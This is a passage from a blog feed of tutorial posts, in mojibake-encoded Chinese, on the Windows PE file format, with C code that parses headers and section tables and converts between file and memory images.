class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">FileToImage</span><span class="hljs-params">(<span class="hljs-type">char</span>* filebuffer)</span>&#123;<br><br>    <span class="hljs-comment">//å®šä¹‰ä¸€äº›æŒ‡é’ˆ</span><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span>* TemBuffer = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//ç®€å•åˆ¤æ–­æœ‰æ•ˆæ€§</span><br>    <span class="hljs-keyword">if</span> (!filebuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (*(PWORD)filebuffer != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not a PE file!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//å¼€å§‹èµ‹å€¼ç›¸åº”æŒ‡é’ˆ</span><br>    DosHeader = (PIMAGE_DOS_HEADER)filebuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)  (filebuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//ç”³è¯·å†…å­˜ä¸­å¤§å°</span><br>TemBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(OptionalHeader-&gt;SizeOfImage);<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–å¹¶å¤åˆ¶å¤´éƒ¨æ•°æ®</span><br>    <span class="hljs-built_in">memset</span>(TemBuffer,<span class="hljs-number">0</span>,OptionalHeader-&gt;SizeOfImage);<br>    <span class="hljs-built_in">memcpy</span>(TemBuffer,DosHeader,OptionalHeader-&gt;SizeOfHeaders);<br><br>    <span class="hljs-comment">//å¼€å§‹å¤åˆ¶èŠ‚åŒºæ•°æ®</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>        <span class="hljs-built_in">memcpy</span>((TemBuffer + SectionHeader-&gt;VirtualAddress),(filebuffer + SectionHeader-&gt;PointerToRawData),SectionHeader-&gt;SizeOfRawData);<br><span class="hljs-comment">//æ›´æ–°ä¸ºä¸‹ä¸€ä¸ªèŠ‚åŒºçš„ç»“æ„ä½“ï¼Œæ­¤æ–¹å¼ä¸ºé‡æ–°è®¡ç®—</span><br>SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + <span class="hljs-number">40</span> * (i + <span class="hljs-number">1</span>));<br>        <span class="hljs-comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼æ›´æ–°ï¼Œæ­¤æ–¹å¼ä¸ºç›¸å¯¹å½“å‰ç»“æ„ä½“è®¡ç®—</span><br>        <span class="hljs-comment">// æ³¨æ„Cè¯­è¨€ä¸­æŒ‡é’ˆåŠ æ³•è§„åˆ™ï¼Œè¿™é‡ŒåŠ 1æŒ‡çš„æ˜¯åŠ 1ä¸€ä¸ªè¿™ä¸ªç»“æ„ä½“å¤§å°</span><br>        <span class="hljs-comment">// SectionHeader +=1 ;</span><br><br>&#125;<br><br>    <span class="hljs-keyword">return</span> TemBuffer;<br>&#125;<br><br><span class="hljs-comment">//==========================image to file==========================</span><br><span class="hljs-type">char</span>* <span class="hljs-title function_">ImageToFile</span><span class="hljs-params">(<span class="hljs-type">char</span>* imagebuffer)</span>&#123;<br><br><span class="hljs-comment">//å®šä¹‰ä¸€äº›æŒ‡é’ˆ</span><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span>* TemBuffer = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-keyword">if</span> (!imagebuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (*(PWORD)imagebuffer != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not a PE file!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>DosHeader = (PIMAGE_DOS_HEADER)imagebuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(imagebuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-comment">//è®¡ç®—åŸæ–‡ä»¶å¤§å°ç”¨äºåˆ†é…ç©ºé—´</span><br>DWORD new_size = OptionalHeader-&gt;SizeOfHeaders;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FileHeader-&gt;NumberOfSections; i++)<br>&#123;<br>new_size += (SectionHeader + IMAGE_SIZEOF_SECTION_HEADER * i)-&gt;SizeOfRawData;<br>&#125;<br><br>TemBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br><br><span class="hljs-comment">//åˆå§‹åŒ–TemBufferåŠå¤´éƒ¨</span><br><span class="hljs-built_in">memset</span>(TemBuffer, <span class="hljs-number">0</span>, new_size);<br><span class="hljs-built_in">memcpy</span>(TemBuffer, imagebuffer, OptionalHeader-&gt;SizeOfHeaders);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FileHeader-&gt;NumberOfSections; i++)<br>&#123;<br><span class="hljs-built_in">memcpy</span>((TemBuffer + SectionHeader-&gt;PointerToRawData), (imagebuffer + SectionHeader-&gt;VirtualAddress), SectionHeader-&gt;SizeOfRawData);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + <span class="hljs-number">40</span> * (i + <span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//åŒç†å¯ç”¨  SectionHeader +=1 ;</span><br>&#125;<br><br><span class="hljs-keyword">return</span> TemBuffer;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br> <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_changed.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    <span class="hljs-comment">//å°†exeè¯»å…¥å†…å­˜ï¼Œæ˜¯filebufferå½¢å¼</span><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br><span class="hljs-type">char</span>* newbuffer;<br>newbuffer = FileToImage(buffer);<br>newbuffer = ImageToFile(newbuffer);<br><br>fwrite(newbuffer,size,<span class="hljs-number">1</span>,fp2);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆäºŒï¼‰</title>
    <link href="/2023/07/01/PE_1/"/>
    <url>/2023/07/01/PE_1/</url>
    
    <content type="html"><![CDATA[<p>PEæ–‡ä»¶ç»“æ„ï¼ˆäºŒï¼‰ èŠ‚è¡¨</p><span id="more"></span><h3 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h3><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“PEæ–‡ä»¶ç»“æ„å‰é¢å‡ éƒ¨åˆ†æ˜¯ç”±DOSå¤´ï¼ˆé€šå¸¸æŠŠDOS stubä¹Ÿç®—å…¥DOSå¤´ä¸­ï¼‰ã€NTå¤´ï¼ŒNTå¤´åˆå¯ä»¥åˆ†ä¸ºSignatureã€æ ‡å‡†PEå¤´ã€å¯é€‰PEå¤´ï¼Œç´§æ¥ç€å¯é€‰PEå¤´çš„å°±æ˜¯èŠ‚è¡¨ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307010213266.png"></p><h3 id="èŠ‚è¡¨"><a href="#èŠ‚è¡¨" class="headerlink" title="èŠ‚è¡¨"></a>èŠ‚è¡¨</h3><h4 id="èŠ‚è¡¨çš„ç´¢å¼•"><a href="#èŠ‚è¡¨çš„ç´¢å¼•" class="headerlink" title="èŠ‚è¡¨çš„ç´¢å¼•"></a>èŠ‚è¡¨çš„ç´¢å¼•</h4><p>åœ¨è§£æèŠ‚è¡¨ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“å¦‚ä½•åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°è¿™ä¸ªèŠ‚è¡¨</p><p>æ ¹æ®PEç»“æ„å›¾æœ‰ä¸€ä¸ªå¾ˆæœ´ç´ çš„æ€æƒ³å»æ‰¾åˆ°è¿™ä¸ªèŠ‚è¡¨åœ¨æ–‡ä»¶ä¸­ä½ç½®ï¼Œå³èŠ‚è¡¨åœ°å€ &#x3D; DOSå¤´å¤§å°+Signatureå¤§å°+æ ‡å‡†PEå¤´å¤§å°+å¯é€‰PEå¤´å¤§å°å³å¯ï¼Œç„¶è€Œå€ŸåŠ©äºDOSå¤´ä¸­ <code>e_lfanew</code> å­—æ®µæˆ‘ä»¬å¯ä»¥ç›´æ¥è·³åˆ°Signatureå¤„ï¼Œæ­¤æ—¶å˜æˆ <code>e_lfanew</code> + Signatureå¤§å° +æ ‡å‡†PEå¤´å¤§å°+å¯é€‰PEå¤´å¤§å°</p><p>å…¶ä¸­Signatureå¤§å°æ˜¯4ä¸ªå­—èŠ‚ï¼ˆPEçš„æ ‡è¯†ï¼‰ï¼Œæ ‡å‡†PEå¤´å¤§å°æ˜¯å›ºå®šçš„0x14å­—èŠ‚ï¼Œæ ‡å‡†PEå¤´ä¸­åˆæœ‰ <code>SizeOfOptionalHeader</code>å­—æ®µæ ‡è¯†å¯é€‰å¤´å¤§å°ï¼Œæ‰€ä»¥èŠ‚è¡¨åœ°å€å°±å¯ä»¥è¡¨ç¤ºä¸º <code>e_lfanew + 4 + 0x14 + SizeofOptionalHeader</code></p><h4 id="èŠ‚åŒºæ•°é‡"><a href="#èŠ‚åŒºæ•°é‡" class="headerlink" title="èŠ‚åŒºæ•°é‡"></a>èŠ‚åŒºæ•°é‡</h4><p>æ—¢ç„¶æåˆ°äº†è¡¨ï¼Œå°±è¯´æ˜è¿™æ˜¯ä¸€ä¸ªçº¿æ€§ç»“æ„ï¼Œåƒä¸€ä¸ªæ•°ç»„ä¸€æ ·å­˜å‚¨äº†è‹¥å¹²å°è¡¨çš„ä¿¡æ¯ï¼Œè¿™ä¸ªå°è¡¨å…¶å®å°±æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œä¹Ÿå³å›¾ä¸­çš„<code>Image_Section_Table</code>,è‡ªç„¶å¤§å°ä¹Ÿå°±æ˜¯ç¡®å®šçš„ã€‚æ¯ä¸€ä¸ªç»“æ„ä½“éƒ½åŒ…å«äº†å¯¹åº”èŠ‚åŒºçš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚èŠ‚åŒºçš„åå­—ã€å¤§å°ç­‰ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥æ‰¾åˆ°èŠ‚è¡¨ï¼Œä½†æ˜¯æ€ä¹ˆç¡®å®šè¿™ä¸ªèŠ‚è¡¨ä¸­æœ‰å¤šå°‘ä¸ª<code>Image_Section_Table</code>å‘¢</p><p>è¿™å°±åˆè¦å›æƒ³åˆ°ä¹‹å‰çš„æ ‡å‡†PEå¤´ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå­—æ®µ<code>NumberOfSections</code>,é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å­˜å‚¨äº†èŠ‚è¡¨çš„æ•°é‡ã€‚</p><p>é‚£ä¹ˆç°åœ¨æœ‰äº†èŠ‚è¡¨çš„èµ·å§‹ä½ç½®ï¼Œåˆæœ‰äº†èŠ‚åŒºçš„æ•°é‡ï¼ŒèŠ‚è¡¨çš„å¤§å°ï¼Œå°½ç®¡ä¸çŸ¥é“èŠ‚è¡¨é‡Œçš„ç»“æ„ä½“éƒ½æœ‰ä»€ä¹ˆæˆå‘˜ï¼Œä½†æ˜¯æœ€èµ·ç ç°åœ¨å¯ä»¥ç¡®å®šæ¯ä¸€ä¸ªç»“æ„ä½“çš„èµ·å§‹ç»ˆæ­¢äº†</p><h4 id="ç»“æ„ä½“æˆå‘˜"><a href="#ç»“æ„ä½“æˆå‘˜" class="headerlink" title="ç»“æ„ä½“æˆå‘˜"></a>ç»“æ„ä½“æˆå‘˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];<span class="hljs-comment">//8ä¸ªå­—èŠ‚ IMAGE_SIZEOF_SHORT_NAMEæ˜¯å® ç­‰äº8 ä¸€èˆ¬æ˜¯asciiç  èŠ‚åŒºåå­—</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>            DWORD   PhysicalAddress;<br>            DWORD   VirtualSize;<br>    &#125; Misc;<span class="hljs-comment">// æ³¨æ„æ˜¯è”åˆä½“ï¼Œå…¶å«ä¹‰æ˜¯æ²¡æœ‰å¯¹é½çš„åœ¨å†…å­˜ä¸­çœŸå®å°ºå¯¸ è¯¥å€¼å¯ä»¥ä¸å‡†ç¡®</span><br>    DWORD   VirtualAddress;<span class="hljs-comment">// èŠ‚åŒºåœ¨å†…å­˜ä¸­çš„åç§»åœ°å€ï¼Œæ˜¯RVA</span><br>    DWORD   SizeOfRawData;<span class="hljs-comment">// èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­å¯¹é½åçš„å°ºå¯¸</span><br>    DWORD   PointerToRawData;<span class="hljs-comment">// èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­åç§»</span><br>    DWORD   PointerToRelocations;<span class="hljs-comment">// åœ¨objæ–‡ä»¶ä¸­ä½¿ç”¨ å¯¹exeæ— æ„ä¹‰</span><br>    DWORD   PointerToLinenumbers;<span class="hljs-comment">// è¡Œå·è¡¨çš„ä½ç½® è°ƒè¯•æ—¶ä½¿ç”¨</span><br>    WORD    NumberOfRelocations;<span class="hljs-comment">// åœ¨objä¸­ä½¿ç”¨ å¯¹exeæ— æ„ä¹‰</span><br>    WORD    NumberOfLinenumbers;<span class="hljs-comment">// è¡Œå·è¡¨çš„æ•°é‡ è°ƒè¯•æ—¶ä½¿ç”¨</span><br>    DWORD   Characteristics;<span class="hljs-comment">// èŠ‚åŒºå±æ€§ å¯å†™å¯è¯»å¯æ‰§è¡Œç­‰ é€šè¿‡æˆ–çš„å½¢å¼æ¥æ·»åŠ å±æ€§</span><br>    <span class="hljs-comment">//0x00000020 å«å¯æ‰§è¡Œä»£ç  0x20000000 è¯¥å—å¯æ‰§è¡Œ 0x40000000 å¯è¯» 0x80000000 å¯å†™</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br><br></code></pre></td></tr></table></figure><p>ä»¥ä¸€ä¸ªå¯¹æ¯”å›¾æ¥è¯´æ˜</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307010246517.png"></p><p>å·¦è¾¹æ˜¯æ–‡ä»¶å½¢å¼ï¼Œå³è¾¹æ˜¯è¿è¡Œæ—¶å½¢å¼</p><ul><li>Name - ä»Aå¼€å§‹çš„8ä¸ªå­—èŠ‚æ˜¯åå­—</li><li>Misc - ä»Aåˆ°Bçš„å¤§å°ï¼Œå¯ä»¥ä¸å‡†ç¡®</li><li>VirtualAddress - å³å›¾ä¸­ ImageBaseåˆ°Açš„è·ç¦»</li><li>SizeOfRawData - å·¦å›¾ä¸­ç»¿è‰²æ¡†çš„å¤§å°</li><li>PointerToRawData - å·¦å›¾ä¸­0åˆ°Açš„è·ç¦»</li></ul><h3 id="ä»£ç æŸ¥æ‰¾"><a href="#ä»£ç æŸ¥æ‰¾" class="headerlink" title="ä»£ç æŸ¥æ‰¾"></a>ä»£ç æŸ¥æ‰¾</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Section_Info</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(buffer + DosHeader-&gt;e_lfanew);<br>    FileHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================Section PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The %dth sec\n&quot;</span>,i+<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name:%s\n&quot;</span>,SectionHeader-&gt;Name);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VitualAddress:%08x\n&quot;</span>, SectionHeader-&gt;VirtualAddress);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfRawData:%08x\n&quot;</span>, SectionHeader-&gt;SizeOfRawData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PointerToRawRata:%08x\n&quot;</span>, SectionHeader-&gt;PointerToRawData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Characteristic:%X\n&quot;</span>, SectionHeader-&gt;Characteristics);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==================================\n&quot;</span>);<br>        SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + <span class="hljs-number">40</span> * (i + <span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;YOU PATH TO EXE HERE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    DWORD size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    Section_Info(fp,buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆä¸€ï¼‰</title>
    <link href="/2023/06/30/PE_0/"/>
    <url>/2023/06/30/PE_0/</url>
    
    <content type="html"><![CDATA[<p> PEæ–‡ä»¶ç»“æ„ï¼ˆä¸€ï¼‰DOSå¤´ NTå¤´</p><span id="more"></span><h2 id="æ€»èµ·"><a href="#æ€»èµ·" class="headerlink" title="æ€»èµ·"></a>æ€»èµ·</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“PEæ˜¯ä»€ä¹ˆã€‚PEï¼Œå³Portable Executableï¼Œä¹Ÿå°±æ˜¯Windowsä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒåŒ…æ‹¬exeæ–‡ä»¶ï¼Œä¹ŸåŒ…æ‹¬dllã€sysæ–‡ä»¶ç­‰ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨åå…­è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ä¸€äº›exeæ–‡ä»¶æ—¶ï¼Œä¼šå¾—åˆ°å¦‚ä¸‹æ ·å­</p><p>å¦‚å›¾æ˜¯ç™¾åº¦ç½‘ç›˜çš„å‰é¢ä¸€å°æ’®çš„éƒ¨åˆ†</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301414772.png"></p><p>å½“æˆ‘ä»¬æ‰“å¼€å…¶ä»–çš„exeæ–‡ä»¶æ—¶ï¼Œè¿™ä¸€å°æ’®å†…å®¹åº”å½“æ˜¯å·®ä¸å¤šçš„ã€‚è¿™å…¶å®å°±è¯´æ˜è¿™äº›PEæ–‡ä»¶åº”å½“å…·æœ‰æŸç§æ ¼å¼ã€‚æˆ‘ä»¬ä¸å¦¨å…ˆçœ‹çœ‹æ•´ä¸ªPEæ–‡ä»¶ç»“æ„å›¾</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301334680.png"></p><p>å½“æˆ‘ä»¬åªçœ‹æœ€ä¸Šé¢ä¸€è¡Œï¼Œå¯ä»¥å‘ç°PEæ–‡ä»¶å¤§è‡´åˆ†ä¸ºå¦‚ä¸‹å‡ éƒ¨åˆ†</p><ul><li>IMGAE_DOS_HEADR - DOSå¤´</li><li>DOS STUB - DOSå¡«å……</li><li>IMAGE_NT_HEADR - NTå¤´</li><li>SECTION_TABLE - 